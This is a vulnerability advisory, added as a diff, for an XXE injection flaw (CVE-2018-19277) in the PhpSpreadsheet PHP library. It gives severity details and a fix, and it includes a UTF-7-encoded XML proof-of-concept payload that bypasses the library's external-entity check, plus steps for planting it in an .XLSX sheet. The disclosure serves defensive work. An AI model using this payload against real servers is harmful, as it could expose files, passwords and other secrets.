@@ -1,0 +1,42 @@
+# Product Description
+PhpSpreadsheet is a library written in pure PHP that provides a set of classes allowing users to read from and write to different spreadsheet file formats, such as Excel and LibreOffice Calc.
+
+# Vulnerabilities List
+One vulnerability was identified within the PhpSpreadsheet library. 
+
+# Affected Version
+Versions <=1.5.0
+
+# Solution
+Identify when the thread-safe libxmlDisableEntityLoader() function is available and disable the ability to load external entities when it is present. In addition, convert XML encoding to UTF-8 prior to performing a security scan.
+
+This vulnerability is described in the following section.
+
+# XML External Entity (XXE) Injection 
+The PhpSpreadsheet library is affected by XXE injection. This vulnerability could be leveraged to read files from a server that hosts an application using this library. An attacker who exploited this vulnerability could extract secrets, passwords, source code, and other sensitive data stored on the filesystem.
+
+# Vulnerability Details
+CVE ID: CVE-2018-19277
+
+Access Vector: Network 
+
+Security Risk: High
+
+Vulnerability: CWE-611
+
+CVSS Base Score: 7.7
+
+CVSS vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+
+The PhpSpreadsheet library implements a security check that halts XML processing if an external entity is detected. An attacker could bypass the check by encoding the XML data as UTF-7 with the following payload:
+
+
+```
+<?xml version="1.0" encoding="UTF-7"?>
+
+<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://127.0.0.1:8080/ext.dtd">%aaa;%ccc;%ddd;]>
+```
+
+The payload above can then be stored as a sheet in a .XLSX document. The attacker can then unzip the .XLSX document and replace the contents of the file xl/worksheets/sheet1.xml with the UTF-7 encoded payload. The document containing the new sheet can then be rezipped.
+
+When the PhpSpreadsheet library processes the newly created .XLSX document, the library makes a request to the URL http://127.0.0.1:8080/ext.dtd. A successful HTTP request means that the external entity was successfully processed.
